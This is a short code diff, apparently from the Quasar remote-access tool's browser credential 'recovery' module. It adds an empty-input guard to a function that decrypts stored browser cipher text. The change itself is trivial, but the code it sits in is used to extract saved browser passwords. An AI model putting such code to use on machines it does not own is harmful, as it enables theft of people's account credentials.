@@ -44,6 +44,10 @@ namespace Quasar.Client.Recovery.Browsers
         {
             try
             {
+                if (string.IsNullOrEmpty(cipherText))
+                    return "";
+
+
                 var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
 
                 var initialisationVector = cipherTextBytes.Skip(3).Take(12).ToArray();
